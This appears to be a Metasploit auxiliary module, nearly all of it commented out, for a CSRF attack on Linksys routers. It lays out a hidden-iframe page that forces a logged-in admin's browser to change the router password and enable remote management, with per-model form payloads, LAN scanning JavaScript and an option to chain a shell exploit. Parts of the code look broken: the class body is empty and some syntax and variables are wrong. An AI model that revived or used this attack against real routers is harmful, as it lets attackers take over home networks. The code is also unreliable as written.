##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	# Rank = ExcellentRanking
	# include Msf::Exploit::Remote::HttpServer::HTML

	# TARGET_AUTO = 0
	# TARGET_EA = 1
	# TARGET_WRT = 2

	# def initialize(info = {})
	# 	super(update_info(info,
	# 		'Name'            => 'Linksys Password Change CSRF Vulnerability',
	# 		'Description'     => %q{
	# 			Many versions of the Linksys admin interface suffer from a CSRF vulnerability.
	# 			If you can coerce (e.g. by phishing) a currently logged-in admin to browse 
	# 			to the page served by this module, a password-change request will be sent from
	# 			the admin's browser to the router. By default, the request will also enable remote
	# 			management so that it is externally accessible. On some routers (e.g. the WRT160Nv2),
	# 			a code exec exploit will be run (from the running Metasploit instance) after
	# 			updating the password.

	# 			Fails silently if the remote user is not logged in.

	# 			Works on the following routers/firmware versions:
	# 			- Linksys EA2700    1.0.14
	# 			- Linksys E4200     2.0.36
	# 			- Linksys EA3500    1.0.30
	# 			- Linksys EA4500    2.0.36
	# 			- Linksys WRT120N   1.0.07
	# 			- Linksys WRT160Nv2 2.0.03
	# 		},
	# 		'Author'          => [ 'Kyle Lovett',                     # discovery
	# 		                       'joev <jvennix[at]rapid7.com>' ],  # msf module
	# 		                                                          # WRT120N discovery
	# 		'License'         => MSF_LICENSE,
	# 		'References'      =>
	# 			[
	# 				[ 'URL', 'https://superevr.com/blog/wp-content/uploads/2013/04/linksys_vulns.txt' ],
	# 				[ 'OSVDB', '94768' ]
	# 			],
	# 		'DisclosureDate' => 'Apr 7 2013',
	# 		'Targets'        => [
	# 			[ 'Linksys EA2700/E4200/EA3500/EA4500', {
	# 			    'ROUTER_IP' => '192.168.1.1',
	# 			    'FORM_ENDPOINT' => '/apply.cgi',
	# 			    'PASSWORD_FIELDS' => ['http_passwd', 'http_passwdConfirm'],
	# 			    'FORM_DATA' => 
	# 			    	'submit_button=Management&change_action=&action=Apply&PasswdModify=1'+
	# 					'&http_enable=1&https_enable=0&ctm404_enable=&remote_mgt_https=0&wait_time=4'+
	# 					'&_http_enable=1&web_wl_filter=0&remote_management=1&_remote_mgt_https=1'+
	# 					'&remote_ip_any=1&http_wanport=8080&nf_alg_sip=0&ctf_enable=1'+
	# 					'&upnp_enable=1&upnp_config=1&upnp_internet_dis=0' ]
	# 			[ 'Linksys WRT120N', 
	# 			    'ROUTER_IP'       => '192.168.1.1', 
	# 			    'FORM_ENDPOINT' => '/cgi-bin/apply.cgi',
	# 			    'PASSWORD_FIELDS' => ['password', 'defPassword'],
	# 			    'FORM_DATA' =>
	# 			      'c_password=admin&r_web_http=1&r_web_https=1&r_web_wleb=1'+
	# 			      '&remote_adm=0&r_remote_adm=0&beginip=0.0.0.0&endip=0.0.0.0'+
	# 			      '&upnp=1&r_upnp=1&r_upnp_uset=1&r_upnp_dinetacc=0&wlan=1'+
	# 			      '&reboot=0&exec_cgis=AdmM&ret_url=%2Findex.stm%3Ftitle%3D'+
	# 			      'Administration-Management&delay=0&change_pass=1' ]
	# 			[ 'Linksys WRT160Nv2',
	# 				'ROUTER_IP'       => '192.168.1.1', 
	# 			    'FORM_ENDPOINT' => '/apply.cgi',
	# 			    'PASSWORD_FIELDS' => ['password', 'defPassword'],
	# 			    'EXPLOIT' => 'exploits/linux/http/linksys_wrt160nv2_apply_exec',
	# 			    'FORM_DATA' =>
	# 			      'c_password=admin&r_web_http=1&r_web_https=1&r_web_wleb=1'+
	# 			      '&remote_adm=0&r_remote_adm=0&beginip=0.0.0.0&endip=0.0.0.0'+
	# 			      '&upnp=1&r_upnp=1&r_upnp_uset=1&r_upnp_dinetacc=0&wlan=1'+
	# 			      '&reboot=0&exec_cgis=AdmM&ret_url=%2Findex.stm%3Ftitle%3D'+
	# 			      'Administration-Management&delay=0&change_pass=1' ],

	# 			]
	# 		],
	# 		'DefaultTarget'  => 0
	# 	))

	# 	register_options([
	# 		Opt::RPORT(80),
	# 		OptAddress.new('RHOST',   [false, 'If known, LAN IP address of the router', '192.168.1.1']),
	# 		OptString.new('PASSWORD', [false, 'Password to change to', 'password']),
	# 		OptString.new('CUSTOMJS', [false, 'Custom javascript to run on client', '']),
	# 		OptString.new('CONTENT',  [false, 'You are being redirected, please wait.', '']),
	# 		OptString.new('DISCOVERRANGE', [false, 'Runs a discovery scan on the range to find & exploit routers']),
	# 		OptBool.new('ROUTERHTTP', [false, 'Access the router over HTTP.', true]),
	# 		OptBool.new('ROUTERHTTPS', [false, 'Access the router over HTTPS.', true]),
	# 		OptBool.new('ENABLE_REMOTE_ADMIN', [false, 'Enable remote router management.', true]),
	# 		OptBool.new('RESTRICT_ADMIN_IP', [false, 'Restrict access to remotely manage router to this IP.', true]),
	# 		OptBool.new('GAIN_SESSION', [false, 'Uses available exploit modules to attempt to gain a shell.', true])
	# 	], Msf::Auxiliary)
	# end

	# # Called when the client makes a request
	# def on_request_uri(cli, request)
	# 	html = if request.uri =~ /inner\.html$/
	# 		inner_html # send contents of <iframe>
	# 		print_status("Sending iframe HTML (for submitting form)...")
	# 	elsif request.uri =~ /\.status$/ # client JS is "reporting" results
	# 		if request.qstring['status'] == '1'
	# 			print_success('Cross domain POST to update password succeeded.')
	# 		else
	# 			print_error("Cross domain POST to update password failed.")
	# 		end
	# 	else
	# 		outer_html # send initial HTML page
	# 		print_status("Client browsed to #{self.name}. Sending HTML with iframe.")
	# 	end
	# 	send_response_html(cli, html)
	# 	handler(cli)
	# end


	# private

	# # @return [String] HTML source of the outer frame
	# def outer_html
	# 	hide_css = 'position:absolute;top:-800px;left:-800px;height:1px;width:1px'
	# 	%Q|
	# 		<!doctype html>
	# 		<html><body>
	# 		<iframe src="#{base_url}.inner.html" style="#{hide_css}"></iframe>
	# 		</body></html>
	# 	|
	# end

	# # @return [String] HTML+JS source of the inner frame
	# def inner_html
	# 	%Q|
	# 		<!doctype html>
	# 		<html>
	# 		<body>
	# 			<iframe src='about:blank' name='i'></iframe>
	# 			<script>
	# 				#{discovery_js}
	# 				try { #{datastore['CUSTOMJS'] || ''} } catch(e) {}
	# 				var form = document.createElement('form');
	# 				var submitForm = function(url) {
	# 					var passwd = '#{datastore['PASSWORD'].gsub("'", "\\'")}';
	# 					form.method = 'POST'; form.action = url; form.target = 'i';
	# 					var data = '#{target['FORM_DATA']}';
	# 					var params = data.split('&');
	# 					var m = null, input = null;
	# 					var addToForm = function(name, val, form) {
	# 						input = document.createElement('input');
	# 						input.type = 'hidden'; input.name = name;
	# 						input.value = value;
	# 						form.appendChild(input);
	# 					}
	# 					for (var param in params) {
	# 						m = param.match(/^(.*)=(.*)$/);
	# 						if (m) { addToForm(m[1], m[2])}
	# 					}
	# 					addToForm('http_passwd', passwd);
	# 					addToForm('http_passwdConfirm', passwd);
	# 					var iframe = document.querySelector('iframe');
	# 					var updateStatus = function(n) {
	# 						var url = '#{base_url}.status?status='+n;
	# 						var img = new Image();
	# 						img.src = url;
	# 					}
	# 					iframe.onload = function() { updateStatus(1); };
	# 					iframe.onerror = function() { updateStatus(0); };
	# 					form.submit();
	# 				};
	# 			</script>
	# 		</body>
	# 		</html>
	# 	|
	# end

	# # @return [String] Javascript code for "discovering" routers in a LAN range
	# # @return '' if discovery is disabled
	# def discovery_js
	# 	range_str = datastore['DISCOVERRANGE']
	# 	return '' unless range_str.present?
	# 	walker = Rex::Socket::RangeWalker.new(range_str)
	# 	ips = []
	# 	walker.each { |ip| ips << ip}
	# 	%Q|
	# 	    var routers = [];
	# 	    var endpoints = #{targets.map { |t| t['FORM_ENDPOINT'] }.to_json};
	# 		var ips = #{ips.to_json};
	# 		for (var ip in ips) {
	# 			(function(){ 
	# 				#{# Put ourselves in a function so that we can preserve scope
	# 				#{# For each IP in the range, attempt to detect router web interface signature
	# 			var myip = ip;
	# 			var cb = function() {
	# 				while (routers.length > 0) {
	# 					submitForm(routers[0][0]+endpoints[routers[0][1]-1]);
	# 					routers.shift();
	# 				}
	# 			}
	# 	| +
	# 	if datastore['Target'] == '#{TARGET_WRT}' or datastore['Target'] == '#{TARGET_AUTO}'
	# 		# Run a check to see if a WRT* router exists 
	# 		%Q|
	# 			var checkWrt = #{check_wrt};
	# 			#{ if datastore['ROUTERHTTP'] then "checkWrt('http', myip)" else '' nil }
	# 			#{ if datastore['ROUTERHTTPS'] then "checkWrt('https', myip)" else '' nil }
	# 		|
	# 	else '' end +
	# 	if datastore['Target'] == "#{TARGET_EA}" or datastore['Target'] == '#{TARGET_AUTO}'
	# 		# Run a check to see if a EA* router exists 
	# 		%Q|
	# 			var checkEa = #{check_ea};
	# 			#{ if datastore['ROUTERHTTP'] then "checkEa('http', myip)" else '' nil }
	# 			#{ if datastore['ROUTERHTTPS'] then "checkEa('https', myip)" else '' nil }
	# 		|
	# 	else '' end +
	# 	%Q|
	# 			})(); #{# invoke the function we defined
	# 		}
	# 	|
	# end

	# def check_wrt
	# 	%Q|
	# 		function(proto, myip) {
	# 			var script = document.createElement('script');
	# 			script.type = 'text/javascript';
	# 			script.src = proto+'://'+myip+'/jslib.js';
	# 			script.onload = function(){
	# 				window.setTimeout(function(){
	# 					if ('isValidMASK' in window) {
	# 						#{# Detected as a WRT120N router.
	# 						routers.push([script.src.replace(/:.*$/, '')+'://'+myip, 1]);
	# 						cb();
	# 					}
	# 				}, 10);
	# 			};
	# 			script.onerror = cb;
	# 			document.body.appendChild(script);
	# 		}
	# 	|
	# end

	# def check_ea
	# 	%Q|
	# 		function(proto, myip) {
	# 			var script = document.createElement('script');
	# 			script.type = 'text/javascript';
	# 			script.src = proto+'://'+myip+'/jslib.js';
	# 			script.onload = function(){
	# 				window.setTimeout(function(){
	# 					if ('isValidMASK' in window) {
	# 						#{# Detected as a WRT120N router.
	# 						routers.push([script.src.replace(/:.*$/, '')+'://'+myip, 2]);
	# 						cb();
	# 					}
	# 				}, 10);
	# 			};
	# 			script.onerror = cb;
	# 			document.body.appendChild(script);
	# 		}
	# 	|
	# end

	# # @return [String] URL for sending requests back to the module
	# def base_url
	# 	proto = (datastore["SSL"] ? "https" : "http")
	# 	myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
	# 	"#{proto}://#{myhost}:#{datastore['SRVPORT']}#{get_resource}"
	# end
end

